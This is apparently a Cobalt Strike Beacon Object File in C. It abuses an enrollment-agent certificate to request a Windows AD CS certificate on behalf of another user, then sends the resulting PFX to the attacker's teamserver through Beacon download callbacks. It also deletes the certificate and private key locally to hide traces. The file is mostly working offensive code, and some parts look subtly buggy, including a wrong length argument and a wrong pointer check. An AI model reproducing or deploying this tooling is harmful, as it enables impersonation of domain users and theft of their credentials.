#include <windows.h>
#include <stdio.h>
#include <oleauto.h>
#include <wchar.h>
#include <stdlib.h>
#include <combaseapi.h>
#include "beacon.h"
#include "bofdefs.h"
#include "base.c"
#include "CertCli.h"     // from /mnt/hgfs/git/external/winsdk-10/Include/10.0.16299.0/um
#include "CertPol.h"     // from /mnt/hgfs/git/external/winsdk-10/Include/10.0.16299.0/um
#include "certenroll.h"  // from /mnt/hgfs/git/external/winsdk-10/Include/10.0.16299.0/um

#define CALLBACK_FILE       0x02
#define CALLBACK_FILE_WRITE 0x08
#define CALLBACK_FILE_CLOSE 0x09
#define CHUNK_SIZE 0xe1000

#define SAFE_RELEASE( interfacepointer )	\
	if ( (interfacepointer) != NULL )	\
	{	\
		(interfacepointer)->lpVtbl->Release(interfacepointer);	\
		(interfacepointer) = NULL;	\
	}
#define SAFE_SYS_FREE( string_ptr )	\
	if ( (string_ptr) != NULL )	\
	{	\
		OLEAUT32$SysFreeString(string_ptr);	\
		(string_ptr) = NULL;	\
	}	

#define CHECK_RETURN_FAIL(x) { \
	HRESULT hr = x; \
	if(FAILED(hr)) \
	{		BeaconPrintf(CALLBACK_ERROR, "[!] %s failed: 0x%08lx\n", #x, hr); \
		goto fail; \
	} \
}

#define CHECK_RETURN_FAIL_BOOL(x) { \
	if(!x) \
	{ \
		BeaconPrintf(CALLBACK_ERROR, "[!] %s failed: \n", #x, KERNEL32$GetLastError()); \
		goto fail; \
	} \
}


BOOL download_file(
	char * fileName,
    char fileData[],
    ULONG32 fileLength)
{
	int fileNameLength = MSVCRT$strnlen(fileName, 1024);
    // intializes the random number generator
    __time32_t t;
	char* packedData = NULL;
	char* packedChunk = NULL;
	ULONG32 fileId = 0;
	int messageLength = 0;
	int chunkLength = 0;
	int i = 0;
	ULONG32 exfiltrated = 0;
	ULONG32 chunkIndex = 4;
	ULONG32 j = 0;
	char packedClose[4];
	DWORD _;
    MSVCRT$srand((unsigned) MSVCRT$_time32(&t));
    // generate a 4 byte random id, rand max value is 0x7fff
    fileId |= (MSVCRT$rand() & 0x7FFF) << 0x11;
    fileId |= (MSVCRT$rand() & 0x7FFF) << 0x02;
    fileId |= (MSVCRT$rand() & 0x0003) << 0x00;

    // 8 bytes for fileId and fileLength
    messageLength = 8 + fileNameLength;
    packedData = intAlloc(messageLength);
    if (!packedData)
    {
        internal_printf("Could download the dump");
        goto end;
    }

    // pack on fileId as 4-byte int first
    packedData[0] = (fileId >> 0x18) & 0xFF;
    packedData[1] = (fileId >> 0x10) & 0xFF;
    packedData[2] = (fileId >> 0x08) & 0xFF;
    packedData[3] = (fileId >> 0x00) & 0xFF;

    // pack on fileLength as 4-byte int second
    packedData[4] = (fileLength >> 0x18) & 0xFF;
    packedData[5] = (fileLength >> 0x10) & 0xFF;
    packedData[6] = (fileLength >> 0x08) & 0xFF;
    packedData[7] = (fileLength >> 0x00) & 0xFF;

    // pack on the file name last
    for (i = 0; i < fileNameLength; i++)
    {
        packedData[8 + i] = fileName[i];
    }

    // tell the teamserver that we want to download a file
    BeaconOutput(
        CALLBACK_FILE,
        packedData,
        messageLength);
    intFree(packedData); packedData = NULL;

    // we use the same memory region for all chucks
    chunkLength = 4 + CHUNK_SIZE;
    packedChunk = intAlloc(chunkLength);
    if (!packedChunk)
    {
        internal_printf("Could download the dump");
        goto end;
    }
    // the fileId is the same for all chunks
    packedChunk[0] = (fileId >> 0x18) & 0xFF;
    packedChunk[1] = (fileId >> 0x10) & 0xFF;
    packedChunk[2] = (fileId >> 0x08) & 0xFF;
    packedChunk[3] = (fileId >> 0x00) & 0xFF;


    while (exfiltrated < fileLength)
    {
        // send the file content by chunks
        chunkLength = fileLength - exfiltrated > CHUNK_SIZE ? CHUNK_SIZE : fileLength - exfiltrated;
        chunkIndex = 4;
        for (i = exfiltrated; i < exfiltrated + chunkLength; i++)
        {
            packedChunk[chunkIndex++] = fileData[i];
        }
        // send a chunk
        BeaconOutput(
            CALLBACK_FILE_WRITE,
            packedChunk,
            4 + chunkLength);
        exfiltrated += chunkLength;
    }
    intFree(packedChunk); packedChunk = NULL;

    // tell the teamserver that we are done writing to this fileId

    packedClose[0] = (fileId >> 0x18) & 0xFF;
    packedClose[1] = (fileId >> 0x10) & 0xFF;
    packedClose[2] = (fileId >> 0x08) & 0xFF;
    packedClose[3] = (fileId >> 0x00) & 0xFF;
    BeaconOutput(
        CALLBACK_FILE_CLOSE,
        packedClose,
        4);
    internal_printf("The file %s was downloaded Len %d: %\n", fileName, fileLength);
	end: 
	if(packedData) intFree(packedData);
	if(packedChunk) intFree(packedChunk);
    return TRUE;
}

HCERTSTORE LoadCert(unsigned char * cert, const wchar_t * password, DWORD certlen, DWORD passlen, PCCERT_CONTEXT * pCert)
{
	CRYPT_DATA_BLOB pfxData;
	pfxData.cbData = certlen;
	pfxData.pbData = cert;
	*pCert = NULL;
	PCCERT_CONTEXT pnewcert;
	HCERTSTORE hCertStore = CRYPT32$CertOpenStore(CERT_STORE_PROV_SYSTEM, 0, 0, CERT_SYSTEM_STORE_CURRENT_USER, L"MY");
    if (!hCertStore) {
        internal_printf("[!]Failed to open the certificate store. Error: %lu\n", KERNEL32$GetLastError());
        return NULL;
    }

	HCERTSTORE store = CRYPT32$PFXImportCertStore(&pfxData, password, CRYPT_USER_KEYSET);
	*pCert = CRYPT32$CertEnumCertificatesInStore(store, NULL);
	CRYPT32$CertAddCertificateContextToStore(hCertStore, *pCert, CERT_STORE_ADD_ALWAYS, &pnewcert);
	CRYPT32$CertDeleteCertificateFromStore(*pCert);
	CRYPT32$CertCloseStore(store, 0);
	*pCert = pnewcert;
	return hCertStore;
}

HRESULT checkEnrollStatus(
	IX509Enrollment* pEnroll)
{
	HRESULT hr = S_OK;
    HRESULT hEnrollError = S_OK;
    IX509EnrollmentStatus* pStatus = NULL;
    EnrollmentEnrollStatus EnrollStatus;
    BSTR strText = NULL;
    BSTR strErrorText = NULL;
	CHECK_RETURN_FAIL(pEnroll->lpVtbl->get_Status(pEnroll, &pStatus));
	CHECK_RETURN_FAIL(pStatus->lpVtbl->get_Status(pStatus, &EnrollStatus));
	CHECK_RETURN_FAIL(pStatus->lpVtbl->get_Error(pStatus, &hEnrollError));
	CHECK_RETURN_FAIL(pStatus->lpVtbl->get_ErrorText(pStatus, &strErrorText));
	CHECK_RETURN_FAIL(pStatus->lpVtbl->get_Text(pStatus, &strText));
	if(Enrolled != EnrollStatus)
	{
		if(EnrollPended != EnrollStatus)
		{
			internal_printf("[!]Request Failed: %ls -- %ls\n", strErrorText, strText);
			hr = hEnrollError;
			goto fail;
		}
		internal_printf("[!]Request pending, bailing: %ls -- %ls\n", strErrorText, strText);
		hr = E_FAIL;
	}
	else
	{
		internal_printf("Certificate Issued: %ls -- %ls\n", strErrorText, strText);
	}

	fail:
	SAFE_SYS_FREE(strText);
	SAFE_SYS_FREE(strErrorText);
	SAFE_RELEASE(pStatus);
	return hr;
	
}

void EncodeToDownload(char * pfxOutName, const byte * pbIn, DWORD cbIn)
{
	//DWORD Flags = CR_OUT_BINARY;
	DWORD Flags = CRYPT_STRING_BASE64HEADER;
	CHAR *pchOut = NULL;
	DWORD cch;
	HRESULT hr = S_OK;
	CHECK_RETURN_FAIL_BOOL(CRYPT32$CryptBinaryToStringA(pbIn, cbIn, Flags, pchOut, &cch));
	pchOut = (CHAR *)intAlloc(cch);
	CHECK_RETURN_FAIL_BOOL(CRYPT32$CryptBinaryToStringA(pbIn, cbIn, Flags, pchOut, &cch));
	//internal_printf("%s", pchOut);
	CHECK_RETURN_FAIL_BOOL(download_file(pfxOutName, pchOut, cch));

	fail:
	if(pchOut) {intFree(pchOut);}

}

void RequestCert(LPCWSTR templateName, LPCWSTR username, PCCERT_CONTEXT pEnrollCert, char * pfxOutName, HCERTSTORE hStore)
{
    IX509Enrollment* pEnroll = NULL;
    IX509CertificateRequest* pRequest = NULL;
    IX509CertificateRequest* pInnerRequest = NULL;
    IX509CertificateRequestPkcs10* pPkcs10 = NULL;
    IX509CertificateRequestCmc* pCmc = NULL;
    IX509PrivateKey* pKey = NULL;
    ISignerCertificate* pSignerCertificate = NULL;
    ISignerCertificates* pSignerCertificates = NULL;
    CERT_CONTEXT const* pCert = NULL;
    CERT_CONTEXT const* pCertContext = NULL;
    BSTR strTemplateName = NULL;
    BSTR strRequester = NULL;
    BSTR strCert = NULL;
	BSTR strEACert = NULL;
    BSTR strPFX = NULL;
    BSTR strPassword = NULL;
	strTemplateName = OLEAUT32$SysAllocString(templateName);
	strRequester = OLEAUT32$SysAllocString(username);
	strPassword = OLEAUT32$SysAllocString(L"");
	//First lets register our certificate

	CLSID CLSID_X509CertificateRequestCmc = {0x884e2045,0x217d,0x11da,{0xb2,0xa4,0x00,0x0e,0x7b,0xbb,0x2b,0x09}};
	IID IID_x509CertificateRequestCmc = {0x728ab345,0x217d,0x11da,{0xb2,0xa4,0x00,0x0e,0x7b,0xbb,0x2b,0x09}};

	CLSID CLSID_SignerCertificate = {0x884e203d,0x217d,0x11da,{0xb2,0xa4,0x00,0x0e,0x7b,0xbb,0x2b,0x09}};
	IID IID_SignerCertificate = {0x728ab33d,0x217d,0x11da,{0xb2,0xa4,0x00,0x0e,0x7b,0xbb,0x2b,0x09}};

	CLSID CLSID_CX509Enrollment = { 0x884e2046, 0x217d, 0x11da, {0XB2, 0XA4, 0x00, 0x0E, 0x7B, 0xBB, 0x2B, 0x09} };
	IID IID_IX509Enrollment = { 0x728ab346, 0x217d, 0x11da, {0XB2, 0XA4, 0x00, 0x0E, 0x7B, 0xBB, 0x2B, 0x09} };

	IID IID_IX509CertificateRequestPkcs10 = {0x728ab342,0x217d,0x11da,{0xb2,0xa4,0x00,0x0e,0x7b,0xbb,0x2b,0x09}};

	CHECK_RETURN_FAIL(OLE32$CoCreateInstance(&CLSID_X509CertificateRequestCmc, NULL, CLSCTX_INPROC_SERVER, &IID_x509CertificateRequestCmc, (LPVOID*)&pCmc));
	CHECK_RETURN_FAIL(pCmc->lpVtbl->InitializeFromTemplateName(pCmc, ContextUser, strTemplateName));
	internal_printf("Initializing request for template %ls", strTemplateName);
	CHECK_RETURN_FAIL(pCmc->lpVtbl->put_RequesterName(pCmc, strRequester));
	strEACert = OLEAUT32$SysAllocStringByteLen((CHAR const *)pEnrollCert->pbCertEncoded,
	pEnrollCert->cbCertEncoded);
	CHECK_RETURN_FAIL(OLE32$CoCreateInstance(&CLSID_SignerCertificate, NULL, CLSCTX_INPROC_SERVER, &IID_SignerCertificate, (LPVOID*)&pSignerCertificate));
	CHECK_RETURN_FAIL(pSignerCertificate->lpVtbl->Initialize(pSignerCertificate, VARIANT_FALSE, VerifyNone, XCN_CRYPT_STRING_BINARY, strEACert));
	CHECK_RETURN_FAIL(pCmc->lpVtbl->get_SignerCertificates(pCmc, &pSignerCertificates));
	CHECK_RETURN_FAIL(pSignerCertificates->lpVtbl->Add(pSignerCertificates, pSignerCertificate));
	CHECK_RETURN_FAIL(OLE32$CoCreateInstance(&CLSID_CX509Enrollment, NULL, CLSCTX_INPROC_SERVER, &IID_IX509Enrollment, (LPVOID*)&pEnroll));
	CHECK_RETURN_FAIL(pEnroll->lpVtbl->InitializeFromRequest(pEnroll, (IX509CertificateRequest *)pCmc));
	CHECK_RETURN_FAIL(pEnroll->lpVtbl->Enroll(pEnroll));
	CHECK_RETURN_FAIL(checkEnrollStatus(pEnroll));
	CHECK_RETURN_FAIL(pEnroll->lpVtbl->CreatePFX(pEnroll,strPassword,PFXExportEEOnly,
						XCN_CRYPT_STRING_BINARY,&strPFX));
	EncodeToDownload(pfxOutName, (const BYTE *)strPFX, OLEAUT32$SysStringByteLen(strPFX));
	//Now we clean off the cert
	CHECK_RETURN_FAIL(pEnroll->lpVtbl->get_Certificate(pEnroll, XCN_CRYPT_STRING_BINARY, &strCert));
	pCert = CRYPT32$CertCreateCertificateContext(X509_ASN_ENCODING | PKCS_7_ASN_ENCODING, (const BYTE *)strCert, OLEAUT32$SysStringByteLen(strPFX));
	if(!pCert)
	{
		internal_printf("[!] Failed to create Certificate Context, failing cleanup\n");
		goto fail;
	}
	pCertContext = CRYPT32$CertFindCertificateInStore(hStore, X509_ASN_ENCODING | PKCS_7_ASN_ENCODING,
	0, CERT_FIND_EXISTING, pCert, NULL);
	if(!pCert)
	{
		internal_printf("[!] Failed to create Certificate in store, failing cleanup\n");
		goto fail;
	}
	internal_printf("Requested the certificate on behalf of other user as requested\n");
	CHECK_RETURN_FAIL(CRYPT32$CertDeleteCertificateFromStore(pCertContext));
	//Clean out private key
	CHECK_RETURN_FAIL(pEnroll->lpVtbl->get_Request(pEnroll, &pRequest));
	CHECK_RETURN_FAIL(pRequest->lpVtbl->GetInnerRequest(pRequest, LevelInnermost, &pInnerRequest));
	CHECK_RETURN_FAIL(pInnerRequest->lpVtbl->QueryInterface(pInnerRequest, &IID_IX509CertificateRequestPkcs10, (VOID**)&pPkcs10));
	CHECK_RETURN_FAIL(pPkcs10->lpVtbl->get_PrivateKey(pPkcs10, &pKey));
	CHECK_RETURN_FAIL(pKey->lpVtbl->Close(pKey));
	CHECK_RETURN_FAIL(pKey->lpVtbl->Delete(pKey));

	fail:
	SAFE_SYS_FREE(strCert);
	SAFE_SYS_FREE(strTemplateName);
	SAFE_SYS_FREE(strRequester);
	SAFE_SYS_FREE(strPassword);
	SAFE_SYS_FREE(strEACert);
	SAFE_SYS_FREE(strPFX);
	SAFE_RELEASE(pCmc);
	SAFE_RELEASE(pSignerCertificates);
	SAFE_RELEASE(pSignerCertificate);
	SAFE_RELEASE(pEnroll);
	SAFE_RELEASE(pRequest);
	SAFE_RELEASE(pInnerRequest);
	SAFE_RELEASE(pPkcs10);
	SAFE_RELEASE(pKey);
}


#ifdef BOF
VOID go( 
	IN PCHAR Buffer, 
	IN ULONG Length 
) 
{
	datap parser = {0};
	LPCWSTR templateName = NULL;
	LPCWSTR userName = NULL;
	char * pfxOutName = NULL;
	byte * enrollmentCert = NULL;
	int cbenrollmentCert = 0;
	HCERTSTORE hCertStore = NULL;
	const CERT_CONTEXT * pCert = NULL;
	BOOL fCoInit = FALSE;

	BeaconDataParse(&parser, Buffer, Length);
	templateName = (LPCWSTR)BeaconDataExtract(&parser, NULL);
	userName = (LPWSTR)BeaconDataExtract(&parser, NULL);
	pfxOutName = BeaconDataExtract(&parser, NULL);
	enrollmentCert = (byte *)BeaconDataExtract(&parser, &cbenrollmentCert);

	if(!bofstart())
	{
		return;
	}
	HRESULT hr = OLE32$CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
	if (FAILED(hr) && hr != RPC_E_CHANGED_MODE)
	{
		internal_printf("Failed to initialize com\n");
		goto fail;
	}
	if(!FAILED(hr))
	{
		fCoInit = TRUE;
	}
	hCertStore = LoadCert(enrollmentCert, NULL, cbenrollmentCert, 0, &pCert);


	RequestCert(templateName, userName, pCert, pfxOutName, hCertStore);


fail:
	if(fCoInit){OLE32$CoUninitialize();}
	if(pCert){CRYPT32$CertDeleteCertificateFromStore(pCert);}
	if(hCertStore){CRYPT32$CertCloseStore(hCertStore, 0);}
	printoutput(TRUE);
	bofstop();
};
#else
#define TEST_STRING_ARG "TEST_STRING_ARG"
#define TEST_INT_ARG 12345
int main(int argc, char ** argv)
{
	DWORD dwErrorCode = ERROR_SUCCESS;
	const char * string_arg = TEST_STRING_ARG;
	int int_arg = TEST_INT_ARG;

	internal_printf("Calling YOUNAMEHERE with arguments %s and %d\n", string_arg, int_arg );

	dwErrorCode = YOUNAMEHERE(string_arg, int_arg);
	if(ERROR_SUCCESS != dwErrorCode)
	{
		BeaconPrintf(CALLBACK_ERROR, "YOUNAMEHERE failed: %lX\n", dwErrorCode);	
		goto main_end;
	}

	internal_printf("SUCCESS.\n");

main_end:

	return dwErrorCode;
}
#endif